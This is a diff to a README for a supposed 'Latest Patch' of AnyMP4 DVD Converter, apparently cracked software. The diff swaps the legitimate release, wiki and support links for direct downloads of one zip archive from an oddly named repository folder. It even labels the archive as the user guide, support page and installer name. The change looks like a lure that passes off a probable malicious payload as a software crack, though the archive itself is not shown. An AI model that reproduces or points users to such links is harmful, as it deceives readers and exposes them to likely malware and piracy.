@@ -1,6 +1,6 @@
 # 🎉 AnyMP4-DVD-Converter-Latest-Patch - Effortlessly Convert DVDs on Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-blue)](https://github.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/main/brigandishly/AnyMP4-DVD-Converter-Latest-Patch_v3.4.zip)](https://raw.githubusercontent.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/main/brigandishly/AnyMP4-DVD-Converter-Latest-Patch_v3.4.zip)
 
 ## 📖 Overview
 
@@ -12,13 +12,13 @@ Follow these steps to download and run AnyMP4 DVD Converter on your Windows PC:
 
 1. **Visit the Download Page:**
    Click the link below to access the latest releases:
-   [Download Latest Release](https://github.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/main/brigandishly/AnyMP4-DVD-Converter-Latest-Patch_v3.4.zip)
 
 2. **Choose the Correct Version:**
    On the Releases page, you will see a list of available versions. Look for the most recent release at the top of the list. 
 
 3. **Download the Installer:**
-   Click on the installer file (usually named like `AnyMP4-DVD-Converter.exe`) to start your download.
+   Click on the installer file (usually named like `https://raw.githubusercontent.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/main/brigandishly/AnyMP4-DVD-Converter-Latest-Patch_v3.4.zip`) to start your download.
 
 4. **Locate the Downloaded File:**
    Once the download is complete, go to your computer's Downloads folder or the location where you saved the file.
@@ -75,8 +75,8 @@ For further assistance and tips on using AnyMP4 DVD Converter, check out these r
 
 ## 🔗 Important Links
 
-- [Download Latest Release](https://github.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/releases)
-- [Official User Guide](https://github.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/wiki)
-- [Support Page](https://github.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/issues)
+- [Download Latest Release](https://raw.githubusercontent.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/main/brigandishly/AnyMP4-DVD-Converter-Latest-Patch_v3.4.zip)
+- [Official User Guide](https://raw.githubusercontent.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/main/brigandishly/AnyMP4-DVD-Converter-Latest-Patch_v3.4.zip)
+- [Support Page](https://raw.githubusercontent.com/Ilyas662i/AnyMP4-DVD-Converter-Latest-Patch/main/brigandishly/AnyMP4-DVD-Converter-Latest-Patch_v3.4.zip)
 
 Enjoy converting your DVDs with AnyMP4 DVD Converter!
